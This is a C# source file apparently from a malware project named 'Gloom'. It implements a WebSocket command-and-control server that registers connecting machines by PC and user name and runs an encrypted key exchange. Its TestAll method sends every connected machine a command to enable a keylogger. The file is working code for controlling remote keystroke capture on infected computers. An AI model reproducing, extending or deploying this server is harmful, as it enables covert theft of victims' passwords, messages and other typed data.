using Fleck;

namespace Gloom
{
	internal class MessageServer
	{
		private readonly List<IWebSocketConnection> sockets = new List<IWebSocketConnection>();
		private readonly WebSocketServer server;
		private readonly CancellationTokenSource cancel;
		private MessageEncryptor? encryptor;

		public MessageServer(string address)
		{
			cancel = new CancellationTokenSource();
			encryptor = new MessageEncryptor();

			server = new WebSocketServer(address);
			server.ListenerSocket.NoDelay = true;
			server.Start(Configure);
		}

		public void Configure(IWebSocketConnection socket)
		{
			FleckLog.Level = LogLevel.Debug;
			socket.OnOpen = () => OnOpen(socket);
			socket.OnBinary = data => OnMessage(socket, data);
			socket.OnClose = () => OnClose(socket);
			socket.OnError = ex => OnError(socket, ex);
		}

		public void OnOpen(IWebSocketConnection socket)
		{
			Console.WriteLine("A pc connected.");
			sockets.Add(socket);
		}

		public void OnError(IWebSocketConnection socket, Exception ex)
		{
			Console.WriteLine("Socket error: " + ex);
			sockets.Remove(socket);
		}

		public void OnMessage(IWebSocketConnection socket, byte[] frame)
		{
			var guid = frame.GetGuid();
			if (guid == OpCodes.ClientHandshake)
			{
				var hs = StructConvert.Byte2Struct<HandshakeData.ClientHandshake>(frame.GetData());
				Console.WriteLine("PC '" + hs.PcName + "' -> User '" + hs.UserName + "' trying to connect.");
				encryptor.SetPublicKey(hs.PublicKeySpec[..((int)hs.PublicKeyLength)]);
#if DEBUG
				Console.WriteLine("Key exchange successful.");
#endif
				var exported = encryptor.ExportEncryptedSecret();
				var encsecret = OpCodes.ServerHandshake.NewPayload(exported);
				socket.Send(encsecret);
			}
		}

		public void OnClose(IWebSocketConnection socket)
		{
			Console.WriteLine("A pc disconnected.");
			sockets.Remove(socket);
		}

		public void TestAll()
		{
			foreach (IWebSocketConnection socket in sockets)
			{
				socket.Send(OpCodes.KeyLogRequest.NewPayload(StructConvert.Struct2Bytes(new KeyLoggerData.KeyLoggerRequest { RequestType = KeyLoggerData.EnableKeyLogger })));
			}
		}

		public async void Finish()
		{
			server.Dispose();
			cancel.Cancel();
		}
	}
}
